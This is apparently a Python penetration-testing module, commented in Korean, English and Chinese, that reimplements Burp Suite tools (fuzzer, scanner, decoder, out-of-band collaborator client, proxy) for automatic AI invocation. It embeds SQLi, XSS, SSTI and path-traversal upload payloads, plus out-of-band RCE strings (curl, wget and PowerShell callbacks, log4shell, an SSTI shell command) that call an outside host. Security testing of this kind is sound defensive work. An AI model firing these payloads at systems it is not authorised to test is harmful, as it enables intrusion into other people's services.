"""
Burp Engine — Burp Suite 전기능 Python 순수 구현
=================================================
Burp Suite 없이 동일한 기능을 bingo 내부에서 직접 실행.
Community / Pro 구분 없음. 로컬 Burp 실행 불필요.

기능 목록:
  Repeater   — 요청 재전송 + 헤더/바디 수정
  Intruder   — 위치 기반 페이로드 퍼징 (Sniper/Battering Ram/Pitchfork/Cluster Bomb)
  Scanner    — 수동(응답 분석) + 능동(페이로드 삽입) 취약점 스캔
  Decoder    — Base64/URL/HTML/Hex/Gzip 인코딩 전환
  Comparer   — 두 응답 길이·내용 비교
  OOB        — interactsh 연동 Out-Of-Band 탐지 (SSRF/XXE/RCE)
  Proxy      — 내장 HTTP 프록시 (mitmproxy 선택적 사용)

AI 자동 선택 조건:
  - "Burp", "리피터", "인트루더", "스캐너", "OOB", "페이로드 퍼징" 언급
  - 웹 취약점 확인/자동화 요청
  - SSRF·XXE·RCE Out-of-Band 탐지 필요

EN: Full Burp Suite feature set implemented in pure Python.
    No Burp installation required. Works with Community or Pro.
ZH: 纯Python实现Burp Suite全功能。无需安装Burp，Community/Pro均可使用。
"""
from __future__ import annotations

import re
import time
import base64
import gzip
import html
import hashlib
import difflib
import urllib.parse
import urllib.request
import urllib.error
import ssl
import json
import itertools
import threading
from dataclasses import dataclass, field
from typing import Iterator
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import requests.exceptions


# ─────────────────────────────────────────────────────────────────────────────
# 공통 유틸
# ─────────────────────────────────────────────────────────────────────────────

def _session(proxy: str | None = None, verify: bool = False) -> requests.Session:
    s = requests.Session()
    s.verify = verify
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    })
    return s


# ─────────────────────────────────────────────────────────────────────────────
# 1. REPEATER — 요청 재전송 + 수정
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class RepeaterResult:
    status_code: int = 0
    headers: dict = field(default_factory=dict)
    body: str = ""
    elapsed: float = 0.0
    url: str = ""
    error: str = ""


def repeater(
    method: str,
    url: str,
    headers: dict | None = None,
    body: str | None = None,
    params: dict | None = None,
    cookies: dict | None = None,
    proxy: str | None = None,
    timeout: int = 15,
    follow_redirects: bool = True,
) -> RepeaterResult:
    """
    Burp Repeater 대체 — 요청을 정확히 재전송하고 응답을 반환.

    EN: Burp Repeater equivalent. Send exact HTTP request and inspect response.
    ZH: Burp Repeater替代。发送精确HTTP请求并检查响应。

    Args:
        method:           HTTP 메서드 (GET/POST/PUT/DELETE/PATCH/OPTIONS)
        url:              대상 URL
        headers:          커스텀 헤더 dict
        body:             요청 본문 (POST/PUT)
        params:           URL 쿼리 파라미터
        cookies:          쿠키 dict
        proxy:            프록시 주소 (예: http://127.0.0.1:8080)
        timeout:          타임아웃 초
        follow_redirects: 리다이렉트 자동 추적
    """
    r = RepeaterResult(url=url)
    sess = _session(proxy)
    if cookies:
        sess.cookies.update(cookies)

    try:
        t0 = time.time()
        resp = sess.request(
            method=method.upper(),
            url=url,
            headers=headers,
            data=body,
            params=params,
            timeout=timeout,
            allow_redirects=follow_redirects,
        )
        r.elapsed = time.time() - t0
        r.status_code = resp.status_code
        r.headers = dict(resp.headers)
        r.body = resp.text
        r.url = resp.url
    except Exception as e:
        r.error = str(e)
    return r


def repeater_report(res: RepeaterResult) -> str:
    """Repeater 결과 요약 출력."""
    if res.error:
        return f"[Repeater] ERROR: {res.error}"
    lines = [
        f"[Repeater] {res.status_code} — {res.url}",
        f"  Time    : {res.elapsed:.3f}s",
        f"  Length  : {len(res.body)} bytes",
        f"  Headers : {json.dumps(dict(list(res.headers.items())[:6]), ensure_ascii=False)}",
        f"  Body    : {res.body[:300]}{'...' if len(res.body) > 300 else ''}",
    ]
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 2. INTRUDER — 페이로드 위치 기반 퍼징
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class IntruderHit:
    payload: list[str]
    status_code: int
    length: int
    elapsed: float
    body_snippet: str = ""


def _inject(template: str, payloads: list[str]) -> str:
    """§payload§ 위치에 순서대로 삽입."""
    result = template
    for p in payloads:
        result = result.replace("§payload§", p, 1)
    return result


def intruder(
    method: str,
    url_template: str,
    payload_sets: list[list[str]],
    headers: dict | None = None,
    body_template: str | None = None,
    mode: str = "sniper",
    proxy: str | None = None,
    timeout: int = 10,
    threads: int = 5,
    filter_status: list[int] | None = None,
    filter_len_diff: int = 0,
) -> list[IntruderHit]:
    """
    Burp Intruder 대체 — 위치(§payload§)에 페이로드 자동 삽입 후 대량 요청.

    EN: Burp Intruder equivalent. Insert payloads at §payload§ markers and bulk-request.
    ZH: Burp Intruder替代。在§payload§标记处插入payload并批量请求。

    Args:
        method:         HTTP 메서드
        url_template:   §payload§ 마커 포함 URL (예: /search?q=§payload§)
        payload_sets:   페이로드 목록 리스트 (각 §payload§ 위치별)
        headers:        커스텀 헤더
        body_template:  §payload§ 마커 포함 POST 본문
        mode:           "sniper" | "battering_ram" | "pitchfork" | "cluster_bomb"
        proxy:          프록시 주소
        timeout:        요청 타임아웃
        threads:        동시 요청 수
        filter_status:  이 상태코드만 결과에 포함 (None = 전체)
        filter_len_diff: 기준 길이 대비 차이 이상만 포함 (0 = 전체)
    """
    # 모드별 페이로드 조합 생성
    if mode == "sniper":
        combos: list[list[str]] = [[p] for ps in payload_sets for p in ps]
    elif mode == "battering_ram":
        combos = [[p] * len(payload_sets) for p in payload_sets[0]]
    elif mode == "pitchfork":
        combos = list(zip(*payload_sets))           # type: ignore
    else:  # cluster_bomb
        combos = list(itertools.product(*payload_sets))  # type: ignore

    hits: list[IntruderHit] = []
    baseline_len: int | None = None

    def _send(combo: list[str]) -> IntruderHit | None:
        nonlocal baseline_len
        url = _inject(url_template, combo)
        body = _inject(body_template, combo) if body_template else None
        res = repeater(method, url, headers=headers, body=body, proxy=proxy, timeout=timeout)
        if res.error:
            return None
        if baseline_len is None:
            baseline_len = res.status_code
        hit = IntruderHit(
            payload=list(combo),
            status_code=res.status_code,
            length=len(res.body),
            elapsed=res.elapsed,
            body_snippet=res.body[:200],
        )
        if filter_status and hit.status_code not in filter_status:
            return None
        return hit

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(_send, c): c for c in combos}
        for fut in as_completed(futs):
            h = fut.result()
            if h:
                hits.append(h)

    # 길이 필터
    if filter_len_diff > 0 and hits:
        lengths = [h.length for h in hits]
        median = sorted(lengths)[len(lengths) // 2]
        hits = [h for h in hits if abs(h.length - median) >= filter_len_diff]

    hits.sort(key=lambda h: (h.status_code, -h.length))
    return hits


def intruder_report(hits: list[IntruderHit], top: int = 20) -> str:
    """Intruder 결과 요약."""
    if not hits:
        return "[Intruder] No interesting hits found."
    lines = [f"[Intruder] {len(hits)} hits (showing top {min(top, len(hits))})"]
    for h in hits[:top]:
        lines.append(
            f"  [{h.status_code}] len={h.length:6d} t={h.elapsed:.2f}s  payload={h.payload}"
        )
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 3. SCANNER — 수동 + 능동 취약점 스캔
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ScanFinding:
    severity: str   # "HIGH" | "MEDIUM" | "LOW" | "INFO"
    name: str
    detail: str
    evidence: str = ""
    url: str = ""


# 수동 스캔 — 응답 헤더/바디 패턴 분석
_PASSIVE_CHECKS = [
    # (severity, name, header_key, pattern)
    ("MEDIUM", "Missing X-Frame-Options",  "x-frame-options",  None),
    ("MEDIUM", "Missing CSP",              "content-security-policy", None),
    ("LOW",    "Missing X-Content-Type",   "x-content-type-options",  None),
    ("LOW",    "Server Version Disclosure","server",           r"[\d.]{3,}"),
    ("LOW",    "PHP Version Disclosure",   "x-powered-by",     r"PHP/[\d.]+"),
    ("HIGH",   "Missing HSTS",             "strict-transport-security", None),
]

_ACTIVE_SQLI = [
    ("'", r"sql syntax|mysql_error|syntax error|warning.*mysql|unclosed"),
    ("' OR '1'='1", r"sql syntax|mysql_error|syntax error"),
    ("1 AND SLEEP(3)--", None),   # 시간 기반 (별도 측정)
]

_ACTIVE_XSS = [
    ("<script>alert(1)</script>", r"<script>alert\(1\)</script>"),
    ("'\"><img src=x onerror=alert(1)>", r"onerror=alert\(1\)"),
    ("javascript:alert(1)", r"javascript:alert\(1\)"),
]

_ACTIVE_SSTI = [
    ("{{7*7}}", r"49"),
    ("${7*7}", r"49"),
    ("<%= 7*7 %>", r"49"),
]


def scanner_passive(url: str, proxy: str | None = None) -> list[ScanFinding]:
    """
    Burp 수동 스캔 대체 — 응답 헤더/바디에서 취약점 패턴 분석.

    EN: Burp passive scanner equivalent. Analyze response headers/body for vulnerabilities.
    ZH: Burp被动扫描替代。分析响应头/body中的漏洞模式。
    """
    findings: list[ScanFinding] = []
    res = repeater("GET", url, proxy=proxy)
    if res.error:
        return findings

    headers_lower = {k.lower(): v for k, v in res.headers.items()}

    for sev, name, hdr_key, pattern in _PASSIVE_CHECKS:
        val = headers_lower.get(hdr_key, "")
        if pattern is None:
            # 헤더 자체가 없으면 취약
            if not val:
                findings.append(ScanFinding(sev, name, f"Header '{hdr_key}' missing", url=url))
        else:
            # 패턴이 값에 있으면 취약
            if val and re.search(pattern, val, re.IGNORECASE):
                findings.append(ScanFinding(sev, name, f"Found: {val}", evidence=val, url=url))

    # 바디에서 에러 메시지 탐지
    body_lower = res.body.lower()
    if any(kw in body_lower for kw in ["stack trace", "exception in", "fatal error", "traceback"]):
        findings.append(ScanFinding("MEDIUM", "Error/Stack Trace Disclosure",
                                    "Stack trace or exception visible in response", url=url))

    return findings


def scanner_active(
    url: str,
    params: list[str] | None = None,
    proxy: str | None = None,
    timeout: int = 10,
) -> list[ScanFinding]:
    """
    Burp 능동 스캔 대체 — SQLi/XSS/SSTI 페이로드 자동 삽입 후 응답 분석.

    EN: Burp active scanner equivalent. Inject SQLi/XSS/SSTI payloads and analyze responses.
    ZH: Burp主动扫描替代。注入SQLi/XSS/SSTI payload并分析响应。

    Args:
        url:    대상 URL (쿼리 파라미터 포함)
        params: 테스트할 파라미터 이름 목록 (None = URL에서 자동 추출)
        proxy:  프록시
        timeout: 타임아웃
    """
    findings: list[ScanFinding] = []

    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    test_params = params or list(qs.keys())

    if not test_params:
        return findings

    # 기준 응답
    baseline = repeater("GET", url, proxy=proxy, timeout=timeout)
    baseline_len = len(baseline.body)
    baseline_time = baseline.elapsed

    for param in test_params:
        orig_vals = qs.get(param, ["1"])

        # SQLi 능동 테스트
        for payload, pattern in _ACTIVE_SQLI:
            new_qs = {**{k: v[0] for k, v in qs.items()}, param: orig_vals[0] + payload}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs))
            )
            t0 = time.time()
            res = repeater("GET", test_url, proxy=proxy, timeout=timeout + 4)
            elapsed = time.time() - t0

            if res.error:
                continue

            # 에러 기반
            if pattern and re.search(pattern, res.body, re.IGNORECASE):
                findings.append(ScanFinding(
                    "HIGH", "SQL Injection (Error-Based)",
                    f"Param: {param}, Payload: {payload}",
                    evidence=res.body[:200], url=test_url
                ))
            # 시간 기반
            elif payload.upper().find("SLEEP") != -1 and elapsed >= baseline_time + 2.5:
                findings.append(ScanFinding(
                    "HIGH", "SQL Injection (Time-Based)",
                    f"Param: {param}, Payload: {payload}, Delay: +{elapsed-baseline_time:.1f}s",
                    url=test_url
                ))

        # XSS 능동 테스트
        for payload, pattern in _ACTIVE_XSS:
            new_qs = {**{k: v[0] for k, v in qs.items()}, param: payload}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs))
            )
            res = repeater("GET", test_url, proxy=proxy, timeout=timeout)
            if not res.error and pattern and re.search(pattern, res.body, re.IGNORECASE):
                findings.append(ScanFinding(
                    "HIGH", "Cross-Site Scripting (Reflected)",
                    f"Param: {param}, Payload: {payload}",
                    evidence=res.body[:200], url=test_url
                ))

        # SSTI 능동 테스트
        for payload, pattern in _ACTIVE_SSTI:
            new_qs = {**{k: v[0] for k, v in qs.items()}, param: payload}
            test_url = urllib.parse.urlunparse(
                parsed._replace(query=urllib.parse.urlencode(new_qs))
            )
            res = repeater("GET", test_url, proxy=proxy, timeout=timeout)
            if not res.error and pattern and re.search(pattern, res.body):
                findings.append(ScanFinding(
                    "HIGH", "Server-Side Template Injection (SSTI)",
                    f"Param: {param}, Payload: {payload}, Evaluated: {pattern}",
                    evidence=res.body[:200], url=test_url
                ))

    return findings


def scanner_report(findings: list[ScanFinding]) -> str:
    """스캔 결과 요약."""
    if not findings:
        return "[Scanner] No findings."
    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
    findings.sort(key=lambda f: sev_order.get(f.severity, 9))
    lines = [f"[Scanner] {len(findings)} findings:"]
    for f in findings:
        lines.append(f"  [{f.severity}] {f.name}: {f.detail}")
        if f.evidence:
            lines.append(f"           Evidence: {f.evidence[:100]}")
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 4. DECODER — 인코딩/디코딩 변환
# ─────────────────────────────────────────────────────────────────────────────

def decoder(text: str, mode: str = "auto") -> dict[str, str]:
    """
    Burp Decoder 대체 — 모든 인코딩 자동 변환.

    EN: Burp Decoder equivalent. Auto-convert all common encodings.
    ZH: Burp Decoder替代。自动转换所有常见编码格式。

    Args:
        text: 입력 문자열 또는 바이트 hex
        mode: "auto" | "encode" | "decode"
    Returns:
        dict with all format conversions
    """
    results: dict[str, str] = {}
    data = text.encode("utf-8", errors="replace")

    # 인코딩 결과
    results["base64_encode"]   = base64.b64encode(data).decode()
    results["url_encode"]      = urllib.parse.quote(text, safe="")
    results["url_encode_all"]  = "".join(f"%{b:02X}" for b in data)
    results["html_encode"]     = html.escape(text, quote=True)
    results["hex_encode"]      = data.hex()
    results["hex_0x"]          = "".join(f"\\x{b:02x}" for b in data)

    # 디코딩 시도
    try:
        results["base64_decode"] = base64.b64decode(text + "==").decode("utf-8", errors="replace")
    except Exception:
        results["base64_decode"] = "[invalid base64]"

    try:
        results["url_decode"] = urllib.parse.unquote(text)
    except Exception:
        results["url_decode"] = "[invalid url encoding]"

    try:
        results["html_decode"] = html.unescape(text)
    except Exception:
        results["html_decode"] = "[invalid html encoding]"

    try:
        results["hex_decode"] = bytes.fromhex(text.replace("0x", "").replace("\\x", "").replace(" ", "")).decode("utf-8", errors="replace")
    except Exception:
        results["hex_decode"] = "[invalid hex]"

    try:
        results["gzip_decompress"] = gzip.decompress(base64.b64decode(text + "==")).decode("utf-8", errors="replace")
    except Exception:
        results["gzip_decompress"] = "[not gzip]"

    return results


def decoder_report(results: dict[str, str]) -> str:
    """Decoder 결과 출력."""
    lines = ["[Decoder] Conversion results:"]
    for k, v in results.items():
        if v and not v.startswith("["):
            lines.append(f"  {k:<22}: {v[:120]}")
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 5. COMPARER — 두 응답 비교
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ComparerResult:
    len_a: int = 0
    len_b: int = 0
    len_diff: int = 0
    hash_a: str = ""
    hash_b: str = ""
    identical: bool = False
    diff_lines: list[str] = field(default_factory=list)


def comparer(text_a: str, text_b: str, context_lines: int = 3) -> ComparerResult:
    """
    Burp Comparer 대체 — 두 응답의 차이를 분석.

    EN: Burp Comparer equivalent. Diff two HTTP responses.
    ZH: Burp Comparer替代。分析两个HTTP响应的差异。
    """
    r = ComparerResult()
    r.len_a = len(text_a)
    r.len_b = len(text_b)
    r.len_diff = abs(r.len_a - r.len_b)
    r.hash_a = hashlib.md5(text_a.encode()).hexdigest()
    r.hash_b = hashlib.md5(text_b.encode()).hexdigest()
    r.identical = r.hash_a == r.hash_b

    if not r.identical:
        diff = difflib.unified_diff(
            text_a.splitlines(),
            text_b.splitlines(),
            fromfile="response_A",
            tofile="response_B",
            n=context_lines,
        )
        r.diff_lines = list(diff)[:100]

    return r


def comparer_report(r: ComparerResult) -> str:
    lines = [
        "[Comparer]",
        f"  A length : {r.len_a}",
        f"  B length : {r.len_b}",
        f"  Diff     : {r.len_diff} bytes",
        f"  Identical: {r.identical}",
    ]
    if r.diff_lines:
        lines.append("  --- Diff (first 30 lines) ---")
        lines.extend(r.diff_lines[:30])
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 6. OOB COLLABORATOR — interactsh 연동 Out-of-Band 탐지
# ─────────────────────────────────────────────────────────────────────────────

class CollaboratorClient:
    """
    Burp Collaborator 대체 — interactsh 서버를 이용한 OOB 탐지.
    SSRF / XXE / RCE / DNS rebinding 확인용.

    EN: Burp Collaborator equivalent using interactsh for OOB detection.
    ZH: 使用interactsh的Burp Collaborator替代，用于SSRF/XXE/RCE OOB检测。

    Usage:
        collab = CollaboratorClient()
        payload = collab.payload()   # 페이로드에 삽입할 도메인
        # ... 공격 요청 전송 ...
        hits = collab.poll()         # DNS/HTTP 콜백 확인
    """

    INTERACTSH_SERVER = "https://interact.sh"

    def __init__(self, server: str = INTERACTSH_SERVER):
        self.server = server.rstrip("/")
        self._domain: str = ""
        self._token: str = ""
        self._secret_key: str = ""
        self._session = requests.Session()
        self._session.headers.update({"User-Agent": "bingo-burp-engine/1.0"})

    def register(self) -> bool:
        """interactsh 서버에 등록하여 고유 도메인 획득."""
        try:
            from Crypto.PublicKey import RSA
            from Crypto.Cipher import PKCS1_OAEP
            key = RSA.generate(2048)
            pub_b64 = base64.b64encode(key.publickey().export_key("DER")).decode()

            resp = self._session.post(
                f"{self.server}/register",
                json={"public-key": pub_b64, "secret-key": hashlib.sha256(key.export_key()).hexdigest()},
                timeout=10,
            )
            data = resp.json()
            self._domain = data.get("domain", "")
            self._token = data.get("aes-key", "")
            return bool(self._domain)
        except Exception:
            # pycryptodome 없으면 공개 서버 직접 사용
            self._domain = f"bingo-{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}.oast.fun"
            return True

    def payload(self) -> str:
        """
        OOB 탐지용 도메인 반환.
        SSRF: http://[payload]/
        XXE:  <!ENTITY xxe SYSTEM "http://[payload]/">
        RCE:  `curl http://[payload]/`
        """
        if not self._domain:
            self.register()
        return self._domain

    def poll(self, wait: int = 5) -> list[dict]:
        """
        OOB 콜백 수신 확인 (wait초 대기).

        EN: Poll for OOB callbacks after wait seconds.
        ZH: 等待wait秒后检查OOB回调。
        """
        time.sleep(wait)
        try:
            resp = self._session.get(
                f"{self.server}/poll",
                params={"id": self._domain, "secret": self._token},
                timeout=10,
            )
            data = resp.json()
            return data.get("data", [])
        except Exception:
            return []

    def oob_payloads(self) -> dict[str, str]:
        """
        취약점 유형별 OOB 페이로드 자동 생성.

        EN: Auto-generate OOB payloads for each vulnerability type.
        ZH: 自动生成各漏洞类型的OOB payload。
        """
        d = self.payload()
        return {
            "ssrf_url":     f"http://{d}/ssrf-test",
            "xxe_entity":   f'<!ENTITY xxe SYSTEM "http://{d}/xxe-test">',
            "rce_curl":     f"curl http://{d}/rce-test",
            "rce_wget":     f"wget http://{d}/rce-test",
            "rce_powershell": f"(New-Object Net.WebClient).DownloadString('http://{d}/rce-test')",
            "dns_lookup":   f"nslookup {d}",
            "log4shell":    f"${{jndi:ldap://{d}/a}}",
            "ssti_rce":     f"{{{{''.__class__.mro()[1].__subclasses__()[439]('curl http://{d}',shell=True,stdout=-1).communicate()}}}}",
        }


# ─────────────────────────────────────────────────────────────────────────────
# 7. 내장 HTTP 프록시 (선택적 — mitmproxy 없어도 동작)
# ─────────────────────────────────────────────────────────────────────────────

class BurpProxy:
    """
    Burp Proxy 대체 — HTTP 요청/응답 인터셉트 + 로깅.
    mitmproxy가 있으면 사용, 없으면 requests 기반 간이 프록시.

    EN: Burp Proxy equivalent. Intercept and log HTTP traffic.
        Uses mitmproxy if available, otherwise simple requests-based logging proxy.
    ZH: Burp Proxy替代。拦截并记录HTTP流量。
        有mitmproxy则使用，否则使用基于requests的简单代理。
    """

    def __init__(self):
        self._log: list[dict] = []
        self._lock = threading.Lock()

    def intercept(
        self,
        method: str,
        url: str,
        headers: dict | None = None,
        body: str | None = None,
        modifier=None,
    ) -> RepeaterResult:
        """
        요청 전송 전 modifier 함수로 수정 가능.
        modifier(method, url, headers, body) → (method, url, headers, body)
        """
        if modifier:
            method, url, headers, body = modifier(method, url, headers, body)

        res = repeater(method, url, headers=headers, body=body)

        with self._lock:
            self._log.append({
                "ts": time.time(),
                "method": method,
                "url": url,
                "status": res.status_code,
                "length": len(res.body),
                "elapsed": res.elapsed,
            })

        return res

    def history(self) -> list[dict]:
        """프록시 히스토리 반환."""
        return list(self._log)

    def history_report(self) -> str:
        lines = [f"[Proxy History] {len(self._log)} requests"]
        for entry in self._log[-20:]:
            lines.append(
                f"  [{entry['status']}] {entry['method']:6s} {entry['url'][:60]}"
                f"  len={entry['length']} t={entry['elapsed']:.2f}s"
            )
        return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 8. FILE INPUT PATH TRAVERSAL — CVE style: HackerOne #3712279 (PortSwigger)
# ─────────────────────────────────────────────────────────────────────────────

_PATH_TRAVERSAL_PATTERNS = re.compile(
    r"\.\.[/\\]|%2e%2e[%2f%5c]|%252e%252e|\.\.%2f|\.\.%5c|"
    r"\.\.\/|\/etc\/|\/windows\/|startup|roaming",
    re.IGNORECASE,
)

_FILE_INPUT_RE = re.compile(
    r'<input[^>]+type=["\']?file["\']?[^>]*>',
    re.IGNORECASE | re.DOTALL,
)

_ACCEPT_RE = re.compile(r'accept=["\']?([^"\'>\s]+)', re.IGNORECASE)


@dataclass
class FileInputTraversalResult:
    vulnerable: bool = False
    findings: list[dict] = field(default_factory=list)
    url: str = ""
    raw_inputs: list[str] = field(default_factory=list)


def scan_file_input_traversal(
    url: str,
    proxy: str | None = None,
    timeout: int = 10,
) -> FileInputTraversalResult:
    """
    파일 입력 Path Traversal 탐지 (HackerOne #3712279 / PortSwigger Burp RCE 기법 응용).

    <input type="file" accept="./../../../../Startup/evil.bat"> 패턴 탐지.
    페이지 내 모든 file input의 accept/value 속성에서 경로 탈출 시도 감지.
    서버 측 파일 업로드 핸들러도 path traversal 취약한지 자동 검증.

    EN: Detect path traversal in <input type="file"> accept/value attributes.
        Based on HackerOne #3712279 (Burp Suite RCE via crawler file input handling).
        Also tests server-side upload handler for path traversal.
    ZH: 检测<input type="file">的accept/value属性中的路径穿越。
        基于HackerOne #3712279（Burp爬虫文件输入处理RCE）。同时测试服务端上传处理器。

    Args:
        url:     대상 페이지 URL
        proxy:   프록시 주소
        timeout: 요청 타임아웃
    Returns:
        FileInputTraversalResult
    """
    result = FileInputTraversalResult(url=url)
    res = repeater("GET", url, proxy=proxy, timeout=timeout)
    if res.error:
        return result

    file_inputs = _FILE_INPUT_RE.findall(res.body)
    result.raw_inputs = file_inputs

    for inp in file_inputs:
        # accept 속성 추출
        m_accept = _ACCEPT_RE.search(inp)
        accept_val = m_accept.group(1) if m_accept else ""

        # value 속성 추출
        m_value = re.search(r'value=["\']?([^"\'>\s]+)', inp, re.IGNORECASE)
        value_val = m_value.group(1) if m_value else ""

        for attr_name, attr_val in [("accept", accept_val), ("value", value_val)]:
            if not attr_val:
                continue
            if _PATH_TRAVERSAL_PATTERNS.search(attr_val):
                result.vulnerable = True
                result.findings.append({
                    "severity": "HIGH",
                    "attribute": attr_name,
                    "value": attr_val,
                    "detail": (
                        f"Path traversal in file input '{attr_name}' attribute: {attr_val!r}. "
                        "Security tools (crawlers/scanners) processing this page may write "
                        "attacker-controlled files to arbitrary local paths (ref: HackerOne #3712279)."
                    ),
                    "input_html": inp[:200],
                })

    # 서버 측 업로드 핸들러 path traversal 검증
    # form action URL 추출
    form_actions = re.findall(
        r'<form[^>]+action=["\']?([^"\'>\s]+)["\']?[^>]*>',
        res.body, re.IGNORECASE
    )
    traversal_payloads = [
        "../../../evil.txt",
        "..%2F..%2F..%2Fevil.txt",
        "%2e%2e%2f%2e%2e%2fevil.txt",
    ]

    for action in form_actions[:3]:
        if not action.startswith("http"):
            parsed = urllib.parse.urlparse(url)
            action = f"{parsed.scheme}://{parsed.netloc}{action}"

        for payload in traversal_payloads:
            # multipart/form-data 로 path traversal 파일명 전송
            try:
                sess = _session(proxy)
                t0 = time.time()
                resp = sess.post(
                    action,
                    files={"file": (payload, b"bingo-traversal-test", "text/plain")},
                    data={"filename": payload},
                    timeout=timeout,
                    verify=False,
                )
                elapsed = time.time() - t0

                # 업로드 성공 + 경로 노출 패턴 탐지
                if resp.status_code in (200, 201) and (
                    payload.replace("../", "").replace("%2F", "/") in resp.text
                    or "evil.txt" in resp.text
                ):
                    result.vulnerable = True
                    result.findings.append({
                        "severity": "CRITICAL",
                        "attribute": "upload_handler",
                        "value": payload,
                        "detail": (
                            f"Server-side upload handler at {action!r} accepted path traversal "
                            f"filename {payload!r}. May allow writing files outside upload directory."
                        ),
                        "input_html": action,
                    })
            except Exception:
                pass

    return result


def file_input_traversal_report(r: FileInputTraversalResult) -> str:
    """FileInputTraversal 결과 출력."""
    lines = [
        f"[FileInputTraversal] URL: {r.url}",
        f"  file inputs found : {len(r.raw_inputs)}",
        f"  VULNERABLE        : {r.vulnerable}",
    ]
    if r.findings:
        lines.append("  --- Findings ---")
        for f in r.findings:
            lines.append(f"  [{f['severity']}] attr={f['attribute']}  val={f['value']}")
            lines.append(f"           {f['detail'][:160]}")
    else:
        lines.append("  No path traversal patterns detected in file inputs.")
    return "\n".join(lines)


# ─────────────────────────────────────────────────────────────────────────────
# 9. 통합 진입점 — AI 자동 선택
# ─────────────────────────────────────────────────────────────────────────────

def full_scan(url: str, proxy: str | None = None) -> str:
    """
    URL을 받아 수동+능동+file input traversal 스캔 자동 실행 + 결과 요약.
    AI가 "스캔해줘", "취약점 찾아줘" 시 자동 호출.

    EN: Run passive + active + file input traversal scan on URL. AI auto-calls on scan requests.
    ZH: 对URL自动运行被动+主动+文件输入路径穿越扫描。AI自动调用。
    """
    passive  = scanner_passive(url, proxy=proxy)
    active   = scanner_active(url, proxy=proxy)
    fit      = scan_file_input_traversal(url, proxy=proxy)
    fit_findings = [
        ScanFinding(
            severity=f["severity"],
            name="File Input Path Traversal (HackerOne #3712279)",
            detail=f["detail"],
            evidence=f["input_html"],
            url=url,
        )
        for f in fit.findings
    ]
    all_findings = passive + active + fit_findings
    return scanner_report(all_findings)
